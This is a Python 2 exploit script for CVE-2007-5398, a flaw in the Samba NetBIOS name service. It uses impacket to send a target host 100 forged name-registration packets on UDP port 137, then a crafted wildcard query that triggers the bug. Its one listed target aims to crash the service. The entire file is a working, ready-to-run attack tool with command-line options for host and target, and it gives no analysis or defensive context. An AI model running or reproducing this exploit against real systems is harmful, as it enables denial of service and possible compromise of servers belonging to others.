#!/usr/bin/python

import struct
import impacket.structure
import impacket.nmb
import random
import sys
import socket
import time

class NMB_Register_Packet(impacket.structure.Structure):
	structure = (
		( 'transaction_id', '!H' ),
		( 'flags', '!H'),
		( 'questions', '!H' ),
		( 'answer_rrs', '!H' ),
		( 'authority_rrs', '!H' ),
		( 'additional_rrs', '!H'),

		( 'query_name', '34s'),
		( 'query_type', '!H' ),
		( 'query_class', '!H' ),

		( 'additional_name', '2s' ),
		( 'additional_type', '!H'),
		( 'additional_class', '!H' ),
		( 'time_to_live', '!L' ),
		( 'data_len', '!H' ),
		( 'additional_flags', '!H' ),
		( 'additional_ipaddr', '!L' )
	)

class NMB_Trigger_Packet(impacket.structure.Structure):
	structure = (
		( 'transaction_id', '!H' ),
		( 'flags', '!H'),
		( 'questions', '!H' ),
		( 'answer_rrs', '!H' ),
		( 'authority_rrs', '!H' ),
		( 'additional_rrs', '!H'),

		( 'query_name', '34s'),
		( 'query_type', '!H' ),
		( 'query_class', '!H' ),
	)

class CVE_2007_5398:

	targets = [
		{
			'name': 'Debugging',
			'description': 'This target aims to crash the vulnerable service',
			'register_packets': 100
		}
	]


	def __init__(self, host, target):
		if(target < 0 or target > len(self.targets)):
			raise Exception, 'Invalid target id specified. Please see -h for more information'

		self.host = host
		self.target_id = target

	def CreateNMBRegisterPacket(self, name, ip, flags):
		encoded_name = impacket.nmb.encode_name(name, 0x1b, "")

		packet = NMB_Register_Packet()
		packet['transaction_id'] = random.randint(0, 0xffff)
		packet['flags'] = 0x2900
		packet['questions'] = 1
		packet['answer_rrs'] = 0
		packet['authority_rrs'] = 0
		packet['additional_rrs'] = 1

		packet['query_name'] = encoded_name
		packet['query_type'] = 0x20
		packet['query_class'] = 0x01

		packet['additional_name'] = "\xc0\x0c"
		packet['additional_type'] = 0x0020
		packet['additional_class'] = 0x0001
		packet['time_to_live'] = 0
		packet['data_len'] = 6
		packet['additional_flags'] = flags
		packet['additional_ipaddr'] = ip

		return str(packet)

	def TriggerVulnerability(self):
		name = impacket.nmb.encode_name('*', 0x1b, "")

		# It appears impacket.nmb.encode_name does not handle the above case every well - so we encode
		# the type manually

		name = name[:31] + "\x42\x4c" + name[33:]

		trigger = NMB_Trigger_Packet()
		trigger['transaction_id'] = random.randint(0, 0xffff)
		trigger['flags'] = 0x0100
		trigger['questions'] = 1
		trigger['answer_rrs'] = 0
		trigger['authority_rrs'] = 0
		trigger['additional_rrs'] = 0

		trigger['query_name'] = name
		trigger['query_type'] = 0x20
		trigger['query_class'] = 0x01

		skt = self.Connect()
		skt.send(str(trigger))
		skt.close()

	def MakeName(self):
		letters = [i for i in range(ord('A'), ord('Z')+1)]
		random.shuffle(letters)
		name = random.sample(letters, random.randint(2, 14))
		name = ''.join([chr(i) for i in name])

		return name

	def CreatePackets(self):
		packets = []

		for i in range(self.targets[self.target_id]['register_packets']):
			# ip = random.randint(0, 0xffffffff)
			ip = 0x68696a6b
			name = self.MakeName()
			packet = self.CreateNMBRegisterPacket(name, ip, 0x6000)
			packets.append(packet)

		return packets

	def Connect(self):
		skt = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
		skt.connect((self.host, 137))
		return skt

	def SendPackets(self, packets):
		skt = self.Connect()
		for packet in packets:
			skt.send(packet)
			time.sleep(0.1)

		skt.close()


	def run(self):
		packets = self.CreatePackets()
		self.SendPackets(packets)

		self.TriggerVulnerability()

def parse_args(args):
	from optparse import OptionParser

	parser = OptionParser()
	parser.set_defaults(host=None, target=None, list=False)

	parser.add_option('--host', dest="host")
	parser.add_option('--target', dest="target", type="int")
	parser.add_option('--list', dest="list", action="store_true")

	opts, args = parser.parse_args(args)

	if(opts.host is None):
		raise Exception, 'Host argument has not been supplied, please run with -h to see parameters'

	if(opts.target is None):
		raise Exception, 'Target argument has not been supplied, please run with -h to see parameters'

	if(opts.list):
		for target in CVE_2007_5398.targets:
			print "%12s    %s" % (target['name'], target['description'])

		sys.exit(1)

	return opts, args

def main(args):
	opts, args = parse_args(args)

	exploit = CVE_2007_5398(opts.host, opts.target)
	exploit.run()

if __name__ == '__main__':
	main(sys.argv[1:])
